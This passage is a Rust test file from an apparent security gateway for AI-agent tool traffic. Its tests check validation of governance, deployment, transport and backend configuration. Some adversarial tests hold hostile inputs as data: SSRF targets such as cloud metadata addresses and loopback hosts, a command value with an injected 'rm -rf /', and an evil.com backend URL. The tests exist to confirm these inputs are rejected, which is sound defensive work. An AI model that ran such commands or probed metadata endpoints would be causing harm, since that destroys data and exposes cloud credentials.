        enable_stego_detection: false,
        content_types: vec!["Image".into(), "Audio".into()],
        blocked_content_types: vec!["Video".into()],
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: MultimodalPolicyConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 26: GOVERNANCE CONFIG TESTS
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_defaults() {
    let config = GovernanceConfig::default();
    assert!(!config.shadow_ai_discovery);
    assert!(!config.require_agent_registration);
    assert_eq!(config.discovery_window_secs, 300);
    assert!(config.approved_tools.is_empty());
    assert!(config.known_servers.is_empty());
    assert!(config.registered_agents.is_empty());
    assert_eq!(
        config.least_agency_enforcement,
        vellaveto_types::EnforcementMode::Monitor
    );
    assert_eq!(config.auto_revoke_after_secs, 3600);
    assert!(config.emit_agency_audit_events);
}

#[test]
fn test_governance_config_serde_roundtrip() {
    let config = GovernanceConfig {
        shadow_ai_discovery: true,
        require_agent_registration: true,
        discovery_window_secs: 600,
        approved_tools: vec!["filesystem".into(), "http".into()],
        known_servers: vec!["server-1".into()],
        registered_agents: vec!["agent-alpha".into(), "agent-beta".into()],
        least_agency_enforcement: vellaveto_types::EnforcementMode::Enforce,
        auto_revoke_after_secs: 7200,
        emit_agency_audit_events: false,
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: GovernanceConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

#[test]
fn test_governance_config_validation_rejects_zero_auto_revoke() {
    let mut config = GovernanceConfig::default();
    config.auto_revoke_after_secs = 0;
    assert!(config.validate().is_err());
}

#[test]
fn test_governance_config_validation_rejects_excessive_auto_revoke() {
    let mut config = GovernanceConfig::default();
    config.auto_revoke_after_secs = 999_999;
    assert!(config.validate().is_err());
}

#[test]
fn test_governance_config_validation_rejects_zero_discovery_window() {
    let mut config = GovernanceConfig::default();
    config.discovery_window_secs = 0;
    assert!(config.validate().is_err());
}

#[test]
fn test_governance_config_validation_accepts_valid() {
    let config = GovernanceConfig::default();
    assert!(config.validate().is_ok());
}

#[test]
fn test_governance_config_in_policy_config() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[governance]
shadow_ai_discovery = true
require_agent_registration = true
approved_tools = ["fs", "http"]
auto_revoke_after_secs = 7200
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.governance.shadow_ai_discovery);
    assert!(config.governance.require_agent_registration);
    assert_eq!(config.governance.approved_tools, vec!["fs", "http"]);
    assert_eq!(config.governance.auto_revoke_after_secs, 7200);
}

#[test]
fn test_governance_config_absent_uses_defaults() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(!config.governance.shadow_ai_discovery);
    assert_eq!(config.governance.auto_revoke_after_secs, 3600);
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R44-017: registered_agents config field
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_registered_agents_serde() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[governance]
shadow_ai_discovery = true
require_agent_registration = true
registered_agents = ["agent-alpha", "agent-beta"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.governance.registered_agents, vec!["agent-alpha", "agent-beta"]);
}

#[test]
fn test_governance_config_registered_agents_defaults_empty() {
    let config = GovernanceConfig::default();
    assert!(config.registered_agents.is_empty());
}

#[test]
fn test_governance_config_validation_rejects_too_many_registered_agents() {
    let mut config = GovernanceConfig::default();
    config.registered_agents = (0..10_001).map(|i| format!("agent-{}", i)).collect();
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("registered_agents"));
}

#[test]
fn test_governance_config_validation_rejects_overlong_agent_id() {
    let mut config = GovernanceConfig::default();
    config.registered_agents = vec!["a".repeat(257)];
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("registered_agents"));
}

#[test]
fn test_governance_config_validation_accepts_max_length_agent_id() {
    let mut config = GovernanceConfig::default();
    config.registered_agents = vec!["a".repeat(256)];
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R44-047: Per-string length validation on approved_tools/known_servers
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_validation_rejects_overlong_tool_name() {
    let mut config = GovernanceConfig::default();
    config.approved_tools = vec!["t".repeat(257)];
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("approved_tools"));
}

#[test]
fn test_governance_config_validation_accepts_max_length_tool_name() {
    let mut config = GovernanceConfig::default();
    config.approved_tools = vec!["t".repeat(256)];
    assert!(config.validate().is_ok());
}

#[test]
fn test_governance_config_validation_rejects_overlong_server_id() {
    let mut config = GovernanceConfig::default();
    config.known_servers = vec!["s".repeat(513)];
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("known_servers"));
}

#[test]
fn test_governance_config_validation_accepts_max_length_server_id() {
    let mut config = GovernanceConfig::default();
    config.known_servers = vec!["s".repeat(512)];
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R44-048: Upper bound on discovery_window_secs
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_validation_rejects_excessive_discovery_window() {
    let mut config = GovernanceConfig::default();
    config.discovery_window_secs = 86_401; // > 24 hours
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("discovery_window_secs"));
}

#[test]
fn test_governance_config_validation_accepts_max_discovery_window() {
    let mut config = GovernanceConfig::default();
    config.discovery_window_secs = 86_400; // exactly 24 hours
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════
// Phase 27: Deployment configuration tests
// ═══════════════════════════════════════════════════

#[test]
fn test_deployment_config_defaults() {
    let config = crate::DeploymentConfig::default();
    assert_eq!(config.mode, crate::DeploymentMode::Standalone);
    assert!(!config.leader_election.enabled);
    assert_eq!(config.leader_election.lease_duration_secs, 15);
    assert_eq!(config.leader_election.renew_interval_secs, 10);
    assert_eq!(config.leader_election.retry_period_secs, 5);
    assert_eq!(config.service_discovery.mode, crate::ServiceDiscoveryMode::Static);
    assert_eq!(config.service_discovery.refresh_interval_secs, 30);
    assert!(config.instance_id.is_none());
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_config_serde_roundtrip() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[deployment]
mode = "kubernetes"
instance_id = "vellaveto-0"

[deployment.leader_election]
enabled = true
lease_duration_secs = 20
renew_interval_secs = 15
retry_period_secs = 3

[deployment.service_discovery]
mode = "dns"
dns_name = "vellaveto-headless.default.svc.cluster.local"
refresh_interval_secs = 15
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.deployment.mode, crate::DeploymentMode::Kubernetes);
    assert_eq!(config.deployment.instance_id, Some("vellaveto-0".to_string()));
    assert!(config.deployment.leader_election.enabled);
    assert_eq!(config.deployment.leader_election.lease_duration_secs, 20);
    assert_eq!(config.deployment.service_discovery.mode, crate::ServiceDiscoveryMode::Dns);
    assert_eq!(
        config.deployment.service_discovery.dns_name,
        Some("vellaveto-headless.default.svc.cluster.local".to_string())
    );
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_config_absent_uses_defaults() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.deployment.mode, crate::DeploymentMode::Standalone);
    assert!(!config.deployment.leader_election.enabled);
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_leader_election_lease_too_short() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.lease_duration_secs = 2;
    let err = config.validate().unwrap_err();
    assert!(err.contains("lease_duration_secs"));
}

#[test]
fn test_deployment_leader_election_lease_too_long() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.lease_duration_secs = 400;
    let err = config.validate().unwrap_err();
    assert!(err.contains("lease_duration_secs"));
}

#[test]
fn test_deployment_leader_election_renew_exceeds_lease() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.lease_duration_secs = 10;
    config.leader_election.renew_interval_secs = 10; // equal, not less
    let err = config.validate().unwrap_err();
    assert!(err.contains("renew_interval_secs"));
}

#[test]
fn test_deployment_leader_election_retry_out_of_range() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.retry_period_secs = 0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("retry_period_secs"));
}

#[test]
fn test_deployment_service_discovery_dns_requires_name() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = None;
    let err = config.validate().unwrap_err();
    assert!(err.contains("dns_name"));
}

#[test]
fn test_deployment_service_discovery_dns_empty_name_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("  ".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("dns_name"));
}

#[test]
fn test_deployment_service_discovery_refresh_out_of_range() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.refresh_interval_secs = 2;
    let err = config.validate().unwrap_err();
    assert!(err.contains("refresh_interval_secs"));
}

#[test]
fn test_deployment_instance_id_too_long() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("a".repeat(254));
    let err = config.validate().unwrap_err();
    assert!(err.contains("instance_id"));
}

#[test]
fn test_deployment_instance_id_empty_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("instance_id"));
}

#[test]
fn test_deployment_instance_id_invalid_chars() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("Vellaveto_0".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("DNS-safe"));
}

#[test]
fn test_deployment_instance_id_leading_hyphen() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("-vellaveto-0".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("hyphen"));
}

#[test]
fn test_deployment_effective_instance_id_configured() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("my-instance".to_string());
    assert_eq!(config.effective_instance_id(), "my-instance");
}

#[test]
fn test_deployment_valid_kubernetes_config() {
    let mut config = crate::DeploymentConfig::default();
    config.mode = crate::DeploymentMode::Kubernetes;
    config.leader_election.enabled = true;
    config.leader_election.lease_duration_secs = 30;
    config.leader_election.renew_interval_secs = 20;
    config.leader_election.retry_period_secs = 5;
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("vellaveto-headless.default.svc.cluster.local".to_string());
    config.instance_id = Some("vellaveto-0".to_string());
    assert!(config.validate().is_ok());
}

// =========================================================================
// Adversarial Tests — Phase 27 (FIND-P27-005, FIND-P27-007)
// =========================================================================

#[test]
fn test_deployment_dns_name_ssrf_localhost_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("localhost:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("loopback"), "expected loopback rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_127_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("127.0.0.1:8080".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("loopback"), "expected loopback rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_127_subnet_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("127.99.99.99:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("loopback"), "expected loopback rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_aws_metadata_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("169.254.169.254:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("metadata") || err.contains("link-local"), "expected metadata rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_gcp_metadata_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("metadata.google.internal:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("metadata") || err.contains("internal"), "expected metadata rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_link_local_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("169.254.0.1:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("link-local"), "expected link-local rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_zero_address_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("0.0.0.0:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("loopback"), "expected loopback rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_ipv6_loopback_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("[::1]:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("loopback"), "expected loopback rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_ssrf_internal_suffix_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("evil.internal:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("metadata") || err.contains("internal"), "expected internal rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_valid_headless_service_accepted() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name =
        Some("vellaveto-headless.prod.svc.cluster.local:3000".to_string());
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_instance_id_leading_dot_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some(".my-instance".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {}", err);
}

#[test]
fn test_deployment_instance_id_trailing_dot_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("my-instance.".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {}", err);
}

#[test]
fn test_deployment_instance_id_consecutive_dots_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("my..instance".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("consecutive dots"), "expected consecutive dots rejection: {}", err);
}

#[test]
fn test_deployment_instance_id_dot_only_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some(".".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {}", err);
}

#[test]
fn test_deployment_instance_id_double_dot_only_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("..".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {}", err);
}

#[test]
fn test_deployment_instance_id_valid_fqdn_style_accepted() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("vellaveto-0.prod".to_string());
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_dns_name_case_insensitive_ssrf_check() {
    // Verify that uppercase bypass attempts are caught
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("LOCALHOST:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("loopback"), "expected case-insensitive loopback rejection: {}", err);
}

#[test]
fn test_deployment_dns_name_azure_metadata_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("169.254.165.254:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("link-local") || err.contains("metadata"), "expected metadata/link-local rejection: {}", err);
}

// ═══════════════════════════════════════════════════════
// Adversarial audit tests (FIND-R44-014): HOSTNAME env var validation
// ═══════════════════════════════════════════════════════

#[test]
fn test_deployment_effective_instance_id_hostname_valid() {
    // When instance_id is not set and HOSTNAME is valid, use HOSTNAME.
    // We can't reliably set env vars in parallel tests, so we test the
    // validate_instance_id helper indirectly via effective_instance_id.
    let config = crate::DeploymentConfig::default();
    // Whatever effective_instance_id returns, it should be DNS-safe.
    let eid = config.effective_instance_id();
    assert!(!eid.is_empty());
    // The result should always pass validation (either from HOSTNAME or fallback).
    assert!(
        eid.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '.') || eid == "vellaveto-unknown",
        "effective_instance_id should be DNS-safe, got '{}'",
        eid
    );
}

#[test]
fn test_deployment_effective_instance_id_configured_takes_precedence() {
    let mut config = crate::DeploymentConfig::default();
    config.instance_id = Some("my-pod-0".to_string());
    assert_eq!(config.effective_instance_id(), "my-pod-0");
}

#[test]
fn test_deployment_validate_instance_id_rejects_uppercase() {
    // The validate_instance_id helper (used by effective_instance_id for HOSTNAME)
    // should reject uppercase characters.
    let result = crate::deployment::validate_instance_id("MY-HOST");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_spaces() {
    let result = crate::deployment::validate_instance_id("my host");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_empty() {
    let result = crate::deployment::validate_instance_id("");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_too_long() {
    let long = "a".repeat(254);
    let result = crate::deployment::validate_instance_id(&long);
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_leading_hyphen() {
    let result = crate::deployment::validate_instance_id("-pod-0");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_trailing_dot() {
    let result = crate::deployment::validate_instance_id("pod-0.");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_consecutive_dots() {
    let result = crate::deployment::validate_instance_id("pod..0");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_accepts_valid() {
    assert!(crate::deployment::validate_instance_id("vellaveto-0").is_ok());
    assert!(crate::deployment::validate_instance_id("pod-0.prod").is_ok());
    assert!(crate::deployment::validate_instance_id("a").is_ok());
}

// ═══════════════════════════════════════════════════════
// Adversarial audit tests (FIND-R44-045): .local TLD warning
// ═══════════════════════════════════════════════════════

#[test]
fn test_deployment_dns_name_local_tld_accepted_with_warning() {
    // .local TLD should be accepted (no reject) but would log a warning.
    // We verify it does not error.
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("myservice.local:8080".to_string());
    assert!(config.validate().is_ok(), ".local TLD should be accepted (with warning)");
}

#[test]
fn test_deployment_dns_name_svc_cluster_local_accepted_no_warning() {
    // .svc.cluster.local should be accepted without warning.
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name =
        Some("vellaveto-headless.default.svc.cluster.local:3000".to_string());
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_dns_name_random_local_not_k8s_accepted() {
    // A .local name that is NOT .svc.cluster.local should still be accepted
    // (only a warning, not a rejection).
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("printer.local:631".to_string());
    assert!(config.validate().is_ok(), "non-k8s .local should be accepted");
}

// ═══════════════════════════════════════════════════════
// Adversarial audit tests (FIND-R42-008, R42-009, R42-013, R42-015)
// ═══════════════════════════════════════════════════════

/// FIND-R42-008: backend.url must use http:// or https:// scheme.
#[test]
fn test_gateway_backend_url_scheme_validation() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "test".to_string(),
            url: "ftp://evil.com/mcp".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("http://") || err.contains("https://"), "expected scheme error: {}", err);
}

/// FIND-R42-008: Valid http:// and https:// schemes pass validation.
#[test]
fn test_gateway_backend_url_valid_schemes() {
    for scheme in &["http://localhost:8080/mcp", "https://example.com/mcp"] {
        let config = crate::GatewayConfig {
            enabled: true,
            backends: vec![crate::BackendConfig {
                id: "test".to_string(),
                url: scheme.to_string(),
                tool_prefixes: vec![],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            }],
            ..Default::default()
        };
        assert!(config.validate().is_ok(), "valid scheme {} should pass", scheme);
    }
}

/// FIND-R42-009: "*" wildcard with other overrides is rejected.
#[test]
fn test_transport_overrides_wildcard_with_others_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "*".to_string(),
        vec![vellaveto_types::TransportProtocol::Http],
    );
    overrides.insert(
        "fs_*".to_string(),
        vec![vellaveto_types::TransportProtocol::Grpc],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("wildcard"), "expected wildcard rejection: {}", err);
}

/// FIND-R42-009: "*" wildcard alone is allowed.
#[test]
fn test_transport_overrides_wildcard_alone_ok() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "*".to_string(),
        vec![vellaveto_types::TransportProtocol::Http],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R42-013: Duplicate protocols in override values rejected.
#[test]
fn test_transport_overrides_duplicate_protocols_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "fs_*".to_string(),
        vec![
            vellaveto_types::TransportProtocol::Http,
            vellaveto_types::TransportProtocol::Http,
        ],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate"), "expected duplicate error: {}", err);
}

/// FIND-R42-015: Duplicate protocols in upstream_priorities rejected.
#[test]
fn test_upstream_priorities_duplicate_rejected() {
    let config = crate::TransportConfig {
        upstream_priorities: vec![
            vellaveto_types::TransportProtocol::Http,
            vellaveto_types::TransportProtocol::Grpc,
            vellaveto_types::TransportProtocol::Http,
        ],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate"), "expected duplicate error: {}", err);
}

// ═══════════════════════════════════════════════════
// ADVERSARIAL AUDIT ROUND 43 TESTS
// ═══════════════════════════════════════════════════

/// FIND-R43-001: stdio_command validated even when stdio_fallback_enabled is false.
/// A malicious command stored in config could be activated later (config reload, flag toggle)
/// without re-validation.
#[test]
fn test_r43_001_stdio_command_validated_when_disabled() {
    // Shell metacharacters in command should be rejected even with fallback disabled.
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("/usr/bin/cmd; rm -rf /".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("shell metacharacters"),
        "expected shell metacharacter rejection: {}",
        err
    );
}

/// FIND-R43-001: Relative path rejected even when fallback disabled.
#[test]
fn test_r43_001_stdio_command_relative_path_rejected_when_disabled() {
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("relative-path/server".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("absolute path"),
        "expected absolute path rejection: {}",
        err
    );
}

/// FIND-R43-001: Valid command passes when disabled.
#[test]
fn test_r43_001_stdio_command_valid_when_disabled() {
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("/usr/bin/mcp-server".to_string()),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-001: Empty stdio_command passes when disabled (not required).
#[test]
fn test_r43_001_stdio_command_empty_passes_when_disabled() {
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("  ".to_string()),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-001: None stdio_command passes when disabled.
#[test]
fn test_r43_001_stdio_command_none_passes_when_disabled() {
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: None,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-003: Duplicate protocols in restricted_transports rejected.
#[test]
fn test_r43_003_restricted_transports_duplicate_rejected() {
    let config = crate::TransportConfig {
        restricted_transports: vec![
            vellaveto_types::TransportProtocol::Grpc,
            vellaveto_types::TransportProtocol::WebSocket,
            vellaveto_types::TransportProtocol::Grpc,
        ],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("duplicate") && err.contains("restricted_transports"),
        "expected restricted_transports duplicate error: {}",
        err
    );
}

/// FIND-R43-003: Unique restricted_transports pass validation.
#[test]
fn test_r43_003_restricted_transports_unique_pass() {
    let config = crate::TransportConfig {
        restricted_transports: vec![
            vellaveto_types::TransportProtocol::Grpc,
            vellaveto_types::TransportProtocol::WebSocket,
        ],
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-004: Backend ID exceeding max length rejected.
#[test]
fn test_r43_004_backend_id_too_long_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "x".repeat(129),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("max length"),
        "expected max length error: {}",
        err
    );
}

/// FIND-R43-004: Backend ID with non-ASCII characters rejected.
#[test]
fn test_r43_004_backend_id_non_ascii_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "backend\ninjection".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("invalid characters"),
        "expected invalid characters error: {}",
        err
    );
}

/// FIND-R43-004: Backend ID with spaces rejected.
#[test]
fn test_r43_004_backend_id_spaces_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "backend one".to_string(),
            url: "http://localhost:8000".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("invalid characters"),
        "expected invalid characters error: {}",
        err
    );
}

/// FIND-R43-004: Valid backend IDs pass (alphanumeric, hyphen, underscore, dot).
#[test]
fn test_r43_004_backend_id_valid_characters_pass() {
    for id in &["my-backend", "backend_1", "b.prod.us-east", "A1-z2_3.4"] {
        let config = crate::GatewayConfig {
            enabled: true,
            backends: vec![crate::BackendConfig {
                id: id.to_string(),
                url: "http://localhost:8000".to_string(),
                tool_prefixes: vec![],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            }],
            ..Default::default()
        };
        assert!(config.validate().is_ok(), "valid ID '{}' should pass", id);
    }
}

/// FIND-R43-005: Duplicate tool_prefix across backends rejected.
#[test]
fn test_r43_005_duplicate_tool_prefix_across_backends_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![
            crate::BackendConfig {
                id: "a".to_string(),
                url: "http://a:8000".to_string(),
                tool_prefixes: vec!["fs_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
            crate::BackendConfig {
                id: "b".to_string(),
                url: "http://b:8000".to_string(),
                tool_prefixes: vec!["fs_".to_string()],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            },
        ],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("duplicate tool_prefix"),
        "expected duplicate tool_prefix error: {}",
        err
    );
}

/// FIND-R43-005: Duplicate tool_prefix within same backend rejected.
#[test]
fn test_r43_005_duplicate_tool_prefix_within_backend_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "a".to_string(),
            url: "http://a:8000".to_string(),
            tool_prefixes: vec!["fs_".to_string(), "db_".to_string(), "fs_".to_string()],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("duplicate tool_prefix"),
        "expected duplicate tool_prefix error: {}",
        err
    );
}

/// FIND-R43-005: Empty tool_prefix string rejected.
#[test]
fn test_r43_005_empty_tool_prefix_rejected() {
    let config = crate::GatewayConfig {
        enabled: true,
